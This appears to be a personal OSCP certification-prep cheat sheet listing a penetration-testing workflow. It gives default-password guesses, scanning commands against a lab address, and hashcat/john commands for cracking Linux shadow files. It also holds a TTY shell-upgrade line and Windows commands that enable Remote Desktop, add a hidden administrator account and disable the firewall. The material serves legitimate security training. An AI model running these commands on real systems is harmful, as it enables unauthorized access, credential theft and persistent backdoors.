# oscp

# cheatsheet

## workflow
1. zenmap intensive scan
2. zenmap full tcp scan
3. attemp to login web / ssh / ftp using common id passwords
  - id: `root`, `admin`
  - password: `root`, `toor`, `password`, `passw0rd`, `admin`, no password
4. if there is a proxy server run on the target, try to set browser's proxy point to the proxy server

## recon
### HTTP and HTTPs
1. dirbuster (gui)
2. dirb http://10.11.1.115:80/ -o 80_dirb.txt -p proxy:port
2. nikto -h http://10.11.1.115:80 -output 80_nikto.txt -useproxy http://proxy:port
3. wpscan to find wordpress problems
4. cms scan (? todo: read it from a tool)

## password hash cracking
Cloud:
- https://crackstation.net/
- https://www.md5online.org/

Local tools:
- hash-identifier
- john
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 unshadowed.txt
```
- hashcat
```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 0 -a 0 unshadowed.txt -o unshadowed_cracked.txt --remove /usr/share/wordlists/rockyou.txt  # md5
hashcat -m 400 -a 0 unshadowed.txt -o unshadowed_cracked.txt --remove /usr/share/wordlists/rockyou.txt  # WordPress (MD5)
hashcat -m 1600 -a 0 unshadowed.txt -o unshadowed_cracked.txt  --remove /usr/share/wordlists/rockyou.txt  # $6$ Linux SHA-256
hashcat -m 0 -a 0 -D 2 unshadowed.txt -o unshadowed_cracked.txt  --remove /usr/share/wordlists/rockyou.txt # use GPU
```
To find hash type,
```bash
hashcat --help | grep -i wordpress
```

Wordlist:
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/phpbb.txt`
- `/usr/share/seclists/Passwords/10k_most_common.txt`

For CTF / OSCP, should not take you more than 30 mins to crack


## generate reverse shell payload
- msfvnon
- https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit

## convert reverse shell to tty
```python
python -c "import pty; pty.spawn('/bin/bash')"
```

## create user account
Linux:


Windows:
```
REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a USER usr= librah, pass= passw0rd
REM ***************
net user /add librah passw0rd
net localgroup "Administrators" /add librah
net localgroup “Remote Desktop Users” /add librah

REM ***************
REM Show USER info
REM ***************
net user librah

netsh firewall set opmode disable  # todo - available on all windows?
```

Reference: 
- https://www.windows-commandline.com/cmd-net-user-command/
- https://www.windows-commandline.com/enable-remote-desktop-command-line/


## references
- https://sushant747.gitbooks.io/total-oscp-guide/
- https://www.securitysift.com/offsec-pwb-oscp/
- https://github.com/xapax/oscp
- Previlege escalation
  - Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - Windows http://www.fuzzysecurity.com/tutorials/16.html
- OSCP experience sharing
  - https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48
  - https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
  - https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19
  - https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
  - https://0daylego.wordpress.com/2017/04/29/scripting-my-way-through-the-oscp-labs/
- [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md)
